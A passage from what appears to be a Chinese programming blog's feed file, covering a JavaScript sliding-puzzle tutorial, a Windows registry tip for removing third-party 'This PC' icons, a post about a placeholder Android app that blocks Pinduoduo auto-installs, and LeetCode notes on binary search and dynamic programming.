class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> time = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//保存定时时间</span></span><br><span class="line"><span class="keyword">var</span> pause = <span class="literal">true</span>;</span><br><span class="line"><span class="comment">//设置是否暂停标志，true表示暂停</span></span><br><span class="line"><span class="keyword">var</span> set_timer;</span><br><span class="line"><span class="comment">//设置定时函数</span></span><br><span class="line"><span class="keyword">var</span> d = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">10</span>);</span><br><span class="line"><span class="comment">//保存大DIV当前装的小DIV的编号</span></span><br><span class="line"><span class="keyword">var</span> d_direct = <span class="keyword">new</span> <span class="title class_">Array</span>(</span><br><span class="line">  [<span class="number">0</span>], <span class="comment">//为了逻辑更简单，第一个元素我们不用，我们从下标1开始使用</span></span><br><span class="line">  [<span class="number">2</span>, <span class="number">4</span>], <span class="comment">//大DIV编号为1的DIV可以去的位置，比如第一块可以去2,4号位置</span></span><br><span class="line">  [<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>],</span><br><span class="line">  [<span class="number">2</span>, <span class="number">6</span>],</span><br><span class="line">  [<span class="number">1</span>, <span class="number">5</span>, <span class="number">7</span>],</span><br><span class="line">  [<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>],</span><br><span class="line">  [<span class="number">3</span>, <span class="number">5</span>, <span class="number">9</span>],</span><br><span class="line">  [<span class="number">4</span>, <span class="number">8</span>],</span><br><span class="line">  [<span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>],</span><br><span class="line">  [<span class="number">6</span>, <span class="number">8</span>]</span><br><span class="line">);</span><br><span class="line"><span class="comment">//保存大DIV编号的可移动位置编号</span></span><br><span class="line"><span class="keyword">var</span> d_posXY = <span class="keyword">new</span> <span class="title class_">Array</span>(</span><br><span class="line">  [<span class="number">0</span>], <span class="comment">//同样，我们不使用第一个元素</span></span><br><span class="line">  [<span class="number">0</span>, <span class="number">0</span>], <span class="comment">//第一个表示left,第二个表示top，比如第一块的位置为let:0px,top:0px</span></span><br><span class="line">  [<span class="number">150</span>, <span class="number">0</span>],</span><br><span class="line">  [<span class="number">300</span>, <span class="number">0</span>],</span><br><span class="line">  [<span class="number">0</span>, <span class="number">150</span>],</span><br><span class="line">  [<span class="number">150</span>, <span class="number">150</span>],</span><br><span class="line">  [<span class="number">300</span>, <span class="number">150</span>],</span><br><span class="line">  [<span class="number">0</span>, <span class="number">300</span>],</span><br><span class="line">  [<span class="number">150</span>, <span class="number">300</span>],</span><br><span class="line">  [<span class="number">300</span>, <span class="number">300</span>]</span><br><span class="line">);</span><br><span class="line"><span class="comment">//大DIV编号的位置</span></span><br><span class="line">d[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">d[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">d[<span class="number">3</span>] = <span class="number">3</span>;</span><br><span class="line">d[<span class="number">4</span>] = <span class="number">4</span>;</span><br><span class="line">d[<span class="number">5</span>] = <span class="number">5</span>;</span><br><span class="line">d[<span class="number">6</span>] = <span class="number">6</span>;</span><br><span class="line">d[<span class="number">7</span>] = <span class="number">7</span>;</span><br><span class="line">d[<span class="number">8</span>] = <span class="number">8</span>;</span><br><span class="line">d[<span class="number">9</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//默认按照顺序排好，大DIV第九块没有，所以为0，我们用0表示空白块</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">move</span>(<span class="params">id</span>) {</span><br><span class="line">  <span class="comment">//移动函数，前面我们已将讲了</span></span><br><span class="line">  <span class="keyword">var</span> i = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">10</span>; ++i) {</span><br><span class="line">    <span class="keyword">if</span> (d[i] == id) <span class="keyword">break</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="comment">//这个for循环是找出小DIV在大DIV中的位置</span></span><br><span class="line">  <span class="keyword">var</span> target_d = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">//保存小DIV可以去的编号，0表示不能移动</span></span><br><span class="line">  target_d = <span class="title function_">whereCanTo</span>(i);</span><br><span class="line">  <span class="comment">//用来找出小DIV可以去的位置，如果返回0，表示不能移动，如果可以移动，则返回可以去的位置编号</span></span><br><span class="line">  <span class="keyword">if</span> (target_d != <span class="number">0</span>) {</span><br><span class="line">    d[i] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//把当前的大DIV编号设置为0，因为当前小DIV已经移走了，所以当前大DIV就没有装小DIV了</span></span><br><span class="line">    d[target_d] = id;</span><br><span class="line">    <span class="comment">//把目标大DIV设置为被点击的小DIV的编号</span></span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">'d'</span> + id).<span class="property">style</span>.<span class="property">left</span> = d_posXY[target_d][<span class="number">0</span>] + <span class="string">'px'</span>;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">'d'</span> + id).<span class="property">style</span>.<span class="property">top</span> = d_posXY[target_d][<span class="number">1</span>] + <span class="string">'px'</span>;</span><br><span class="line">    <span class="comment">//最后设置被点击的小DIV的位置，把它移到目标大DIV的位置</span></span><br><span class="line">  }</span><br><span class="line">  <span class="comment">//如果target_d不为0，则表示可以移动，且target_d就是小DIV要去的大DIV的位置编号</span></span><br><span class="line">  <span class="keyword">var</span> finish_flag = <span class="literal">true</span>;</span><br><span class="line">  <span class="comment">//设置游戏是否完成标志，true表示完成</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> k = <span class="number">1</span>; k &lt; <span class="number">9</span>; ++k) {</span><br><span class="line">    <span class="keyword">if</span> (d[k] != k) {</span><br><span class="line">      finish_flag = <span class="literal">false</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">      <span class="comment">//如果大DIV保存的编号和它本身的编号不同，则表示还不是全部按照顺序排的，那么设置为false，跳出循环，后面不用再判断了，因为只要一个不符，就没完成游戏</span></span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="comment">//从1开始，把每个大DIV保存的编号遍历一下，判断是否完成</span></span><br><span class="line">  <span class="keyword">if</span> (finish_flag == <span class="literal">true</span>) {</span><br><span class="line">    <span class="keyword">if</span> (!pause) <span class="title function_">start</span>();</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">'congratulation'</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="comment">//如果为true，则表示游戏完成，如果当前没有暂停，则调用暂停韩式，并且弹出提示框，完成游戏。</span></span><br><span class="line">  <span class="comment">//start()这个函数是开始，暂停一起的函数，如果暂停，调用后会开始，如果开始，则调用后会暂停</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">whereCanTo</span>(<span class="params">cur_div</span>) {</span><br><span class="line">  <span class="comment">//判断是否可移动函数，参数是大DIV的编号，不是小DIV的编号，因为小DIV编号跟可以去哪没关系，小DIV是会动的</span></span><br><span class="line">  <span class="keyword">var</span> j = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">var</span> move_flag = <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; d_direct[cur_div].<span class="property">length</span>; ++j) {</span><br><span class="line">    <span class="comment">//把所有可能去的位置循环遍历一下</span></span><br><span class="line">    <span class="keyword">if</span> (d[d_direct[cur_div][j]] == <span class="number">0</span>) {</span><br><span class="line">      move_flag = <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">//如果目标的值为0，说明目标位置没有装小DIV，则可以移动，跳出循环</span></span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> (move_flag == <span class="literal">true</span>) {</span><br><span class="line">    <span class="keyword">return</span> d_direct[cur_div][j];</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="comment">//可以移动，则返回目标位置的编号，否则返回0，表示不可移动</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//定时函数，每一秒执行一次</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">timer</span>(<span class="params"></span>) {</span><br><span class="line">  time += <span class="number">1</span>; <span class="comment">//一秒钟加一，单位是秒</span></span><br><span class="line">  <span class="keyword">var</span> min = <span class="built_in">parseInt</span>(time / <span class="number">60</span>); <span class="comment">//把秒转换为分钟，一分钟60秒，取商就是分钟</span></span><br><span class="line">  <span class="keyword">var</span> sec = time % <span class="number">60</span>; <span class="comment">//取余就是秒</span></span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">'timer'</span>).<span class="property">innerHTML</span> = min + <span class="string">'分'</span> + sec + <span class="string">'秒'</span>; <span class="comment">//然后把时间更新显示出来</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//开始暂停函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">start</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">if</span> (pause) {</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">'start'</span>).<span class="property">innerHTML</span> = <span class="string">'暂停'</span>; <span class="comment">//把按钮文字设置为暂停</span></span><br><span class="line">    pause = <span class="literal">false</span>; <span class="comment">//暂停表示设置为false</span></span><br><span class="line">    set_timer = <span class="built_in">setInterval</span>(timer, <span class="number">1000</span>); <span class="comment">//启动定时</span></span><br><span class="line">    <span class="comment">//如果当前是暂停，则开始</span></span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">'start'</span>).<span class="property">innerHTML</span> = <span class="string">'开始'</span>;</span><br><span class="line">    pause = <span class="literal">true</span>;</span><br><span class="line">    <span class="built_in">clearInterval</span>(set_timer);</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//重置函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">reset</span>(<span class="params"></span>) {</span><br><span class="line">  time = <span class="number">0</span>; <span class="comment">//把时间设置为0</span></span><br><span class="line">  <span class="title function_">random_d</span>(); <span class="comment">//把方块随机打乱函数</span></span><br><span class="line">  <span class="keyword">if</span> (pause)</span><br><span class="line">    <span class="comment">//如果暂停，则开始计时</span></span><br><span class="line">    <span class="title function_">start</span>();</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//随机打乱方块函数，我们的思路是从第九块开始，随机生成一个数，然后他们两块对调一下</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">random_d</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">9</span>; i &gt; <span class="number">1</span>; --i) {</span><br><span class="line">    <span class="keyword">var</span> to = <span class="built_in">parseInt</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * (i - <span class="number">1</span>) + <span class="number">1</span>); <span class="comment">//产生随机数，范围为1到i，不能超出范围，因为没这个id的DIV</span></span><br><span class="line">    <span class="keyword">if</span> (d[i] != <span class="number">0</span>) {</span><br><span class="line">      <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">'d'</span> + d[i]).<span class="property">style</span>.<span class="property">left</span> = d_posXY[to][<span class="number">0</span>] + <span class="string">'px'</span>;</span><br><span class="line">      <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">'d'</span> + d[i]).<span class="property">style</span>.<span class="property">top</span> = d_posXY[to][<span class="number">1</span>] + <span class="string">'px'</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">//把当前的DIV位置设置为随机产生的DIV的位置</span></span><br><span class="line">    <span class="keyword">if</span> (d[to] != <span class="number">0</span>) {</span><br><span class="line">      <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">'d'</span> + d[to]).<span class="property">style</span>.<span class="property">left</span> = d_posXY[i][<span class="number">0</span>] + <span class="string">'px'</span>;</span><br><span class="line">      <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">'d'</span> + d[to]).<span class="property">style</span>.<span class="property">top</span> = d_posXY[i][<span class="number">1</span>] + <span class="string">'px'</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">//把随机产生的DIV的位置设置为当前的DIV的位置</span></span><br><span class="line">    <span class="keyword">var</span> tem = d[to];</span><br><span class="line">    d[to] = d[i];</span><br><span class="line">    d[i] = tem;</span><br><span class="line">    <span class="comment">//然后把它们两个的DIV保存的编号对调一下</span></span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化函数，页面加载的时候调用重置函数，重新开始</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) {</span><br><span class="line">  <span class="title function_">reset</span>();</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>好了，所有代码都已经编写完成了。现在点击桌面上的 <code>puzzle.html</code> 文件，使用 浏览器 打开，就能看到效果了。点击上面的方块就可以移动。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过此项目，我们利用 HTML5 + CSS3 + JavaScript，实现了一个简单的拼图游戏。</p><p>这里说明一下，因为实验中使用的随机打乱方块的算法非常简单，但是存在 bug，有 50% 的概率生成的顺序是无法复原的，这个时候就只能点击重新开始。</p>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> 前端 </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>删除Win10此电脑里的设备和驱动器中的图标</title>
      
      
      <link href="/cn/posts/39253/"/>
      
      
      <url>/cn/posts/39253/</url>
      
      
        
      <content type="html"><![CDATA[<p>删除Win10此电脑里的设备和驱动器中的百度云图标，同样方法还可以删除暴风影音，迅雷等。</p><p>不知从何时起，资源管理器“此电脑(Win10)/这台电脑(Win8/Win8.1)/计算机(Win7)”的“设备和驱动器”中就开始流行被植入一些第三方项目。客观上说，这些项目给经常使用这些软件的用户提供了很大便利。但有些用户则并不需要这种“便利”，因为这些项目之所以能够出现在这种位置，完全是软件自身设置的原因，并非用户有意安排。而且鉴于这种现象越来越普遍，导致某些用户“此电脑”中“设备和驱动器”项目数量十分壮观。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/39253/20200608130032138.png" alt="img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>虽然这些软件的设置中也都有移除这些“入口”的选项，但如果这些项目过多，挨个删除未免太过麻烦。有没有什么办法能够一次性删除所有多余项目呢?答案是肯定的，在注册表中就可以实现。需要提醒各位的是，注册表操作需谨慎，最好提前进行备份，以防止误操作带来的麻烦。</p><p>　　<strong>具体方法如下：</strong></p><p>1、在开始-运行输入regedit后回车</p><p>2、定位到 HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace\</p><blockquote><p>如果上述的注册表为空，或者无效，则定位到HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace\</p><p>将不是系统自带的全删掉，<strong>最好右键NameSpace备份一下，以免误删</strong></p><p>其他不在下面列表的可以一个一个删除尝试，但一定要<strong>记得备份</strong></p><p>系统自带的参考：</p><p>{1CF1260C-4DD0-4ebb-811F-33C572699FDE}–音乐<br>{374DE290-123F-4565-9164-39C4925E467B}–下载<br>{3ADDbai-EB32-4cb0-BBD7-DFA0ABB5ACCA}–图片<br>{A0953C92-50DC-43bf-BE83-3742FED03C9C}–视频<br>{A8CDFF1C-4878-43be-B5FD-F8091C1C60D0}–文档<br>{B4BFCC3A-DB2C-424C-B029-7FE99A87C641}–桌面</p><p>{0DB7E03F-FC29-4DC6-9020-FF41B59E513A}–3D对象文件夹</p></blockquote><p>3、删除该位置下的所有值，或者你认为可以删除的值(只留“默认”就可以)</p><blockquote><p>这里是删HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace\的内容哈，别整错了。</p></blockquote><p>重新打开“此电脑”后，所有第三方项目应该都被“肃清”了。</p>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> Windows </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>如何让手机点到广告的时候不会自动安装拼多多</title>
      
      
      <link href="/cn/posts/57274/"/>
      
      
      <url>/cn/posts/57274/</url>
      
      
        
      <content type="html"><![CDATA[<p>今天真的很烦，打开某app，就会马上跳转到应用商店自动下载拼多多。于是乎我直接做了一个和拼多多包名一样的app，这样误点到广告的时候就不会自动安装拼多多了。原理非常简单，大佬勿喷，我不是专门做安卓的</p><p>当然有需要的童鞋也可以点下面的链接下载，没有申请任何权限，很干净。</p><p>蓝奏云下载 <a href="https://link.zhihu.com/?target=https://www.lanzoux.com/iZbxPgnlf3i">https://www.lanzoux.com/iZbxPgnlf3i</a></p><p>或者百度云链接：<a href="https://link.zhihu.com/?target=https://pan.baidu.com/s/17Rbrn9AXGf5knsWSZZzqqg">https://pan.baidu.com/s/17Rbrn9AXGf5knsWSZZzqqg</a></p><p>提取码：g77c</p>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> 安卓 </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>算法与数据结构学习笔记：二分法</title>
      
      
      <link href="/cn/posts/59351/"/>
      
      
      <url>/cn/posts/59351/</url>
      
      
        
      <content type="html"><![CDATA[<h1 id="二分搜索模板"><a href="#二分搜索模板" class="headerlink" title="二分搜索模板"></a>二分搜索模板</h1><p>给一个<strong>有序数组</strong>和目标值，找第一次/最后一次/任何一次出现的索引，如果没有出现返回-1</p><p>模板四点要素</p><ul><li>1、初始化：start=0、end=len-1</li><li>2、循环退出条件：start + 1 &lt; end</li><li>3、比较中点和目标值：A[mid] ==、 &lt;、&gt; target</li><li>4、判断最后两个元素是否符合：A[start]、A[end] ? target</li></ul><p>注意：为了防止overflow，超过int范围，左中位数（a+b)=a+(b-a)/2,右中位数（a+b)=a+(b-a+1)/2如果有mid*mid,mid用int注意溢出</p><p>时间复杂度 O(logn)，使用场景一般是有序数组的查找</p><p>典型示例</p><h4 id="704-二分查找"><a href="#704-二分查找" class="headerlink" title="704. 二分查找"></a><a href="https://leetcode-cn.com/problems/binary-search/">704. 二分查找</a></h4><blockquote><p>给定一个 n 个元素有序的（升序）整型数组 nums 和一个目标值 target  ，写一个函数搜索 nums 中的 target，如果目标值存在返回下标，否则返回 -1。</p></blockquote><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">search</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target)</span> </span>{</span><br><span class="line">        <span class="type">int</span> start,mid,end;</span><br><span class="line">        start=<span class="number">0</span>;</span><br><span class="line">        end=nums.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span>(start&lt;=end)</span><br><span class="line">        {</span><br><span class="line">            mid=start+(end-start)/<span class="number">2</span>;<span class="comment">//防止两数之和超过int范围</span></span><br><span class="line">            <span class="keyword">if</span>(nums[mid]==target)</span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid]&gt;target)</span><br><span class="line">            {</span><br><span class="line">                end=mid<span class="number">-1</span>;</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span>{</span><br><span class="line">                start=mid<span class="number">+1</span>;</span><br><span class="line">            }</span><br><span class="line">            </span><br><span class="line">        </span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>大部分二分查找类的题目都可以用这个模板，然后做一点特殊逻辑即可</p><p>另外二分查找还有一些其他模板如下文，大部分场景模板#3 都能解决问题，而且还能找第一次/最后一次出现的位置，应用更加广泛</p><p>所以用模板#3 就对了</p><p><strong>模板 #1 (left &lt;= right)</strong></p><p>二分查找的最基础和最基本的形式。<br>查找条件可以在不与元素的两侧进行比较的情况下确定（或使用它周围的特定元素）。<br>不需要后处理，因为每一步中，你都在检查是否找到了元素。如果到达末尾，则知道未找到该元素。</p><p><strong>模板 #2 (left &lt; right)</strong></p><p>一种实现二分查找的高级方法。<br>查找条件需要访问元素的直接右邻居。<br>使用元素的右邻居来确定是否满足条件，并决定是向左还是向右。<br>保证查找空间在每一步中至少有 2 个元素。<br>需要进行后处理。 当你剩下 1 个元素时，循环 / 递归结束。 需要评估剩余元素是否符合条件。</p><p><strong>模板 #3 (left + 1 &lt; right)</strong></p><p>实现二分查找的另一种方法。<br>搜索条件需要访问元素的直接左右邻居。<br>使用元素的邻居来确定它是向右还是向左。<br>保证查找空间在每个步骤中至少有 3 个元素。<br>需要进行后处理。 当剩下 2 个元素时，循环 / 递归结束。 需要评估其余元素是否符合条件。</p><p>如果是最简单的二分搜索，不需要找第一个、最后一个位置、或者是没有重复元素，可以使用模板#1，代码更简洁</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>二分搜索核心四点要素（必背&amp;理解）</p><ul><li>1、初始化：start=0、end=len-1</li><li>2、循环退出条件：start + 1 &lt; end</li><li>3、比较中点和目标值：A[mid] ==、 &lt;、&gt; target</li><li>4、判断最后两个元素是否符合：A[start]、A[end] ? target</li></ul>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> cpp </tag>
        
            
            
        <tag> 算法 </tag>
        
            
            
        <tag> 二分法 </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>算法与数据结构学习笔记：动态规划</title>
      
      
      <link href="/cn/posts/26904/"/>
      
      
      <url>/cn/posts/26904/</url>
      
      
        
      <content type="html"><![CDATA[<h2 id="线性-DP"><a href="#线性-DP" class="headerlink" title="线性 DP"></a>线性 DP</h2><h3 id="最经典单串"><a href="#最经典单串" class="headerlink" title="最经典单串"></a>最经典单串</h3><h4 id="300-最长上升子序列"><a href="#300-最长上升子序列" class="headerlink" title="300. 最长上升子序列"></a><a href="https://leetcode-cn.com/problems/longest-increasing-subsequence/">300. 最长上升子序列</a></h4><blockquote><p>给定一个无序的整数数组，找到其中最长上升子序列的长度。</p><p>示例:</p><p>输入: [10,9,2,5,3,7,101,18]<br>输出: 4<br>解释: 最长的上升子序列是 [2,3,7,101]，它的长度是 4。</p></blockquote><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">lengthOfLIS</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>{</span><br><span class="line">        <span class="type">int</span> maxLength=<span class="number">0</span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(nums.size(),<span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.<span class="built_in">size</span>();i++)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;i;j++)</span><br><span class="line">            {</span><br><span class="line">                <span class="keyword">if</span>(nums[i]&gt;nums[j]&amp;&amp;dp[i]&lt;(dp[j]<span class="number">+1</span>))</span><br><span class="line">                {</span><br><span class="line">                    dp[i]=dp[j]<span class="number">+1</span>;</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">            maxLength=<span class="built_in">max</span>(maxLength,dp[i]);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> maxLength;</span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h3 id="最经典双串："><a href="#最经典双串：" class="headerlink" title="最经典双串："></a>最经典双串：</h3><h4 id="1143-最长公共子序列"><a href="#1143-最长公共子序列" class="headerlink" title="1143. 最长公共子序列"></a><a href="https://leetcode-cn.com/problems/longest-common-subsequence/">1143. 最长公共子序列</a></h4><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">longestCommonSubsequence</span><span class="params">(string text1, string text2)</span> </span>{</span><br><span class="line">        <span class="type">int</span> len1=text<span class="number">1.</span><span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> len2=text<span class="number">2.</span><span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> dp[len1<span class="number">+2</span>][len2<span class="number">+2</span>];</span><br><span class="line">        <span class="built_in">memset</span>(dp,<span class="number">0</span>,<span class="built_in">sizeof</span>(dp));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=len1;i++)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=len2;j++)</span><br><span class="line">            {</span><br><span class="line">                <span class="keyword">if</span>(text1[i<span class="number">-1</span>]==text2[j<span class="number">-1</span>])</span><br><span class="line">                {</span><br><span class="line">                    dp[i][j]=dp[i<span class="number">-1</span>][j<span class="number">-1</span>]<span class="number">+1</span>;</span><br><span class="line">                }</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                {</span><br><span class="line">                    dp[i][j]=<span class="built_in">max</span>(dp[i][j<span class="number">-1</span>],dp[i<span class="number">-1</span>][j]);</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> dp[len1][len2];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h3 id="经典问题："><a href="#经典问题：" class="headerlink" title="经典问题："></a>经典问题：</h3>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> cpp </tag>
        
            
            
        <tag> 算法 </tag>
        
            
            
        <tag> 动态规划 </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>算法与数据结构学习笔记：栈和队列</title>
      
      
      <link href="/cn/posts/51468/"/>
      
      
      <url>/cn/posts/51468/</url>
      
      
        
